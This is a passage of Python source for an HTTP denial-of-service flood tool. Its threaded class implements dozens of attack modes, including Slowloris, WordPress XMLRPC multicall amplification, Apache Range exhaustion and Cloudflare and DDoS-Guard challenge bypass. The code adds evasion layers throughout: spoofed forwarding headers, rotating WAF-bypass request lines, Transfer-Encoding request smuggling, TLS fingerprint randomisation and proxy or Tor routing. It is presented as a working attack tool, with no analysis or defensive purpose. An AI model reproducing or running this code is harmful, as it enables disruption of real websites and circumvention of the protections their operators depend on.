        if "x-cdn" in h and "imperva" in h["x-cdn"].lower():
            return "Imperva"
        if "server" in h and "ddos-guard" in h["server"].lower():
            return "DDoS-Guard"
        if "x-ddg-project" in h or "ddg-id" in h:
            return "DDoS-Guard"
        if "x-amzn-requestid" in h:
            return "AWS CloudFront"
        if "x-vercel-id" in h:
            return "Vercel"
        if "x-fastly-request-id" in h:
            return "Fastly"
        return "Unknown / None"


# noinspection PyBroadException,PyUnusedLocal
class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))
        # Per-generation kill switch — set externally by adaptive rotation logic
        # to drain only OLD HttpFlood threads while keeping L4 + main event running.
        # If None, behaves like vanilla (only obeys self._synevent).
        self._kill_event: Any = None


        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "XMLRPC_MULTI": self.XMLRPC_MULTI,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "SLOWLORIS": self.SLOWLORIS,
            "WORDPRESS": self.WORDPRESS,
            "H2": self.H2,
            "H2_RST": self.H2_RST,
            "COOKIE_HARVEST": self.COOKIE_HARVEST,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
            "ASYNC": self.ASYNC,
            "WS": self.WS,
            "GQL": self.GQL,
            "H2_PRIORITY": self.H2_PRIORITY,
            "RANGE_CRASH": self.RANGE_CRASH,
            "STEALTH": self.STEALTH,
            "MIX": self.MIX,
            "RAPID": self.RAPID,
            "QUIC": self.QUIC,
            "TLS_FLOOD": self.TLS_FLOOD,
            "H2_CONT": self.H2_CONT,
            "IMPERSONATE": self.IMPERSONATE,
            "MEGA": self.MEGA,
        }



        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                "https://drive.google.com/viewerng/viewer?url=",
                "https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ',
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ',
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ',
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
                'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
                'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
                'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
            ]
        self._useragents = list(useragents)
        self._stealth = False
        self._req_type = self.getMethodType(method)

        # Pre-computed static body parts for generate_payload (bytes for fast concatenation)
        self._body_base = (
            b'Accept-Encoding: gzip, deflate, br\r\n'
            b'Accept-Language: en-US,en;q=0.9\r\n'
            b'Cache-Control: max-age=0\r\n'
            b'Connection: keep-alive\r\n'
            b'Sec-Fetch-Dest: document\r\n'
            b'Sec-Fetch-Mode: navigate\r\n'
            b'Sec-Fetch-Site: none\r\n'
            b'Sec-Fetch-User: ?1\r\n'
            b'Sec-Gpc: 1\r\n'
            b'Pragma: no-cache\r\n'
            b'Upgrade-Insecure-Requests: 1\r\n'
        )
        self._host_header = None  # Lazy init
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                      target.raw_path_qs, randchoice(['1.0', '1.1']))
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: keep-alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
                
    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        # Tag this thread with its method so Tools.send can record per-method
        # telemetry without changing 50+ call sites. This unlocks adaptive
        # visibility for the 21 raw-socket methods (GET/POST/STRESS/SLOW/etc).
        _set_thread_method(self._method)
        ke = self._kill_event
        while self._synevent.is_set() and (ke is None or not ke.is_set()):
            self.SENT_FLOOD()
            if getattr(self, '_stealth', False):
                sleep(randint(1, 50) / 1000)



    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return ("X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    _bust_counter = 0

    def _cache_bust_path(self) -> str:
        """Randomize path with cache-buster query params to avoid CDN/ModSecurity pattern detection."""
        self._bust_counter += 1
        params = [
            f"_r{randint(1, 3)}={int(time.time()*1000)}",
            f"v={self._bust_counter % 9999}",
            f"cb={randint(0, 9)}{ProxyTools.Random.rand_str(3)}",
            f"t={ProxyTools.Random.rand_int(1000, 999999)}",
        ]
        sep = "&" if "?" in self._target.raw_path_qs else "?"
        return self._target.raw_path_qs + sep + randchoice(params)

    # ModSecurity / Generic WAF bypass vectors — rotated per request
    _bypass_idx = 0

    def _bypass_request_line(self, path: str) -> str:
        """Generate request line with random WAF bypass technique."""
        bypass = randint(0, 7)
        self._bypass_idx = (self._bypass_idx + 1) % 8

        if bypass == 0:
            # Normal (baseline — keeps WAF off-guard)
            return f"{self._req_type} {path} HTTP/1.1\r\n"
        elif bypass == 1:
            # Cache-busting query param: bypass edge-cache, forces origin hit
            qs_path = f"{path}?{ProxyTools.Random.rand_str(4)}={ProxyTools.Random.rand_str(8)}"
            return f"{self._req_type} {qs_path} HTTP/1.1\r\n"
        elif bypass == 2:
            # Absolute URI: proxy-aware WAF parses differently than origin
            abs_path = f"{self._target.scheme}://{self._target.authority}{path}"
            return f"{self._req_type} {abs_path} HTTP/1.1\r\n"
        elif bypass == 3:
            # Double leading slash: //path → Apache/IIS accept, some WAF skip
            return f"{self._req_type} //{path.lstrip('/')} HTTP/1.1\r\n"
        elif bypass == 4:
            # HTTP/1.0 with absolute URI: dual evasion vector
            abs_path = f"{self._target.scheme}://{self._target.authority}{path}"
            return f"{self._req_type.upper()} {abs_path} HTTP/1.0\r\n"
        elif bypass == 5:
            # Upper-case method + HTTP/1.0 → case-sensitive rule evasion
            return f"{self._req_type.upper()} {path} HTTP/1.0\r\n"
        elif bypass == 6:
            # Space padding after method: "GET  /path HTTP/1.1\r\n"
            return f"{self._req_type}  {path} HTTP/1.1\r\n"
        else:  # 7
            # Mixed-case HTTP version with leading zero
            return f"{self._req_type} {path} http/1.1\r\n"

    def generate_payload(self, other: str = None) -> bytes:
        # Per-request randomization: bypass, HTTP version, cache busting
        path = self._cache_bust_path() if bool(randint(0, 1)) else self._target.raw_path_qs
        request_line = self._bypass_request_line(path)

        # Choose 1 of 3 body-obfuscation strategies per request
        chunk_mode = randint(0, 2)
        # Lazy init host header bytes (only computed once per instance)
        if self._host_header is None:
            self._host_header = f"Host: {self._target.authority}\r\n".encode()
        headers = self.randHeadercontent
        trailer = (other if other else "").encode() + b"\r\n" if other else b""

        if chunk_mode == 0:
            # Normal (no body obfuscation)
            if b"\r\n\r\n" in request_line.encode():  # HTTP/0.9 — no headers
                return request_line.encode()
            return request_line.encode() + self._body_base + self._host_header + headers.encode() + trailer
        elif chunk_mode == 1:
            # Double Content-Length: WAF uses first, server uses last (RFC7230 3.3.3)
            chunk_size = ProxyTools.Random.rand_int(8, 64)
            chunk_body = hex(chunk_size)[2:].encode() + b"\r\n" + b"A" * 16 + b"\r\n0\r\n\r\n"
            body_extra = b'Content-Length: 0\r\nTransfer-Encoding: chunked\r\n'
            return request_line.encode() + body_extra + self._body_base + self._host_header + headers.encode() + trailer + chunk_body
        else:  # chunk_mode == 2
            # TE smuggling: double Transfer-Encoding, WAF parses first, backend second
            chunk_size = ProxyTools.Random.rand_int(8, 32)
            chunk_body = hex(chunk_size)[2:].encode() + b"\r\n" + b"B" * 8 + b"\r\n0\r\n\r\n"
            body_extra = b'Transfer-Encoding: chunked\r\nTransfer-encoding: xchunked\r\n'
            return request_line.encode() + body_extra + self._body_base + self._host_header + headers.encode() + trailer + chunk_body

    _sockets_per_thread: int = 25

    def open_connection(self, host=None) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(0.7)
        try:
            sock.connect(host or self._raw_target)
        except Exception:
            Tools.safe_close(sock)
            return None

        # TLS with randomized cipher ordering per connection (JA3/JA4 evasion)
        try:
            if self._target.scheme.lower() == "https":
                tls_ctx = TLSRandomizer.get_ssl_context()
                sock = tls_ctx.wrap_socket(sock,
                                           server_hostname=host[0] if host else self._target.host,
                                           server_side=False,
                                           do_handshake_on_connect=True,
                                           suppress_ragged_eofs=True)
        except Exception:
            Tools.safe_close(sock)
            return None
        return sock

    def multi_send(self, payload, count=1):
        socks = []
        for _ in range(self._sockets_per_thread):
            s = self.open_connection()
            if s:
                socks.append(s)
        for s in socks:
            if not s: continue
            try:
                for _ in range(count):
                    s.sendall(payload)
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
            except:
                pass
        for s in socks:
            Tools.safe_close(s)

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                            "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", "RHEX", "STOMP", "SLOWLORIS", "WORDPRESS", "H2", "COOKIE_HARVEST",
                                            "STEALTH", "MIX", "RAPID", "QUIC"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "GET"

    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload: Any = str.encode(self._payload +
                                  f"Host: {target}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection(target)
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def STRESS(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 524\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32)))
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (ProxyTools.Random.rand_str(64),
             ProxyTools.Random.rand_str(64)))[:-2]
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def XMLRPC_MULTI(self) -> None:
        """XMLRPC system.multicall amplification: 1 HTTP POST = 200 XMLRPC calls.
           Each call triggers wp.deletePost, wp.editPost, wp.getOptions etc.
           Amplification factor: 200x per request."""
        # Build 200 methodCalls packed into system.multicall
        num_calls = 200
        def _one_call(method_name):
            return (
                "<value><struct>"
                f"<member><name>methodName</name><value><string>{method_name}</string></value></member>"
                "<member><name>params</name><value><array><data>"
                "<value><string>1</string></value>"
                "</data></array></value></member>"
                "</struct></value>"
            )
        calls = "".join(_one_call("wp.deletePost") for _ in range(num_calls))
        body = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<methodCall><methodName>system.multicall</methodName>'
            '<params><param><value><array><data>'
            f'{calls}'
            '</data></array></value></param></params>'
            '</methodCall>'
        )
        content_length = len(body)
        extra = (
            f"Content-Length: {content_length}\r\n"
            "X-Requested-With: XMLHttpRequest\r\n"
            "Content-Type: text/xml; charset=utf-8\r\n\r\n"
            f"{body}"
        )
        payload: bytes = self.generate_payload(extra)[:-2]
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def PPS(self) -> None:
        payload: Any = str.encode(self._defaultpayload +
                                  f"Host: {self._target.authority}\r\n\r\n")
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def KILLER(self) -> None:
        """Spawn GET threads with hard cap to prevent OOM.

        NOTE: previous version bumped REQUESTS_SENT on every spawn,
        which inflated the RPS counter without any real request having
        been sent yet (just `Thread.start()` overhead). The spawned
        GET workers themselves bump REQUESTS_SENT correctly via Tools.send,
        so we let them be the source of truth instead of double-counting."""
        spawned = 0
        max_extra = 200
        while self._synevent.is_set() and spawned < max_extra:
            Thread(target=self.GET, daemon=True).start()
            spawned += 1
            sleep(0.01)

        # Continue flooding via GET in this thread
        while self._synevent.is_set():
            self.GET()


    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                Tools.send(s, p1)
                Tools.send(s, p2)
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                while Tools.send(s, payload) and s.recv(1):
                    continue
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(min(self._rpc, 5)):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        _adaptive_record_status(res.status_code, self._method)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
                    _adaptive_record_status(res.status_code, self._method)
        Tools.safe_close(s)

    def CFBUAM(self):

        payload: bytes = self.generate_payload()
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                Tools.send(s, payload)
                sleep(5.01)
                ts = time.time()
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                    if time.time() > ts + 120: break
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def AVB(self):
        payload: bytes = self.generate_payload()
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    sleep(max(self._rpc / 1000, 1))
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxies:
                pro = randchoice(self._proxies)
                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
                            _adaptive_record_status(res.status_code, self._method)
                            continue
                Tools.safe_close(ss)
                return

            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        _adaptive_record_status(res.status_code, self._method)
            Tools.safe_close(ss)


    def DYN(self):
        payload: Any = str.encode(self._payload +
                                  f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()

        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                    while 1:
                        sleep(.01)
                        data = s.recv(1)
                        if not data:
                            break
                Tools.send(s, b'0')
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        _adaptive_record_status(res.status_code, self._method)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
                    _adaptive_record_status(res.status_code, self._method)
        Tools.safe_close(s)

    def GSB(self):

        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                           self._target.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                             "Host: %s\r\n" % self._target.authority +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def RHEX(self):
        randhex = str(randbytes(([32, 64, 128][randint(0, 2)])))
        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        randhex) +
                             "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: keep-alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    def STOMP(self):
        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
               'Accept-Language: en-US,en;q=0.9\r\n'
               'Cache-Control: max-age=0\r\n'
               'Connection: keep-alive\r\n'
               'Sec-Fetch-Dest: document\r\n'
               'Sec-Fetch-Mode: navigate\r\n'
               'Sec-Fetch-Site: none\r\n'
               'Sec-Fetch-User: ?1\r\n'
               'Sec-Gpc: 1\r\n'
               'Pragma: no-cache\r\n'
               'Upgrade-Insecure-Requests: 1\r\n\r\n')
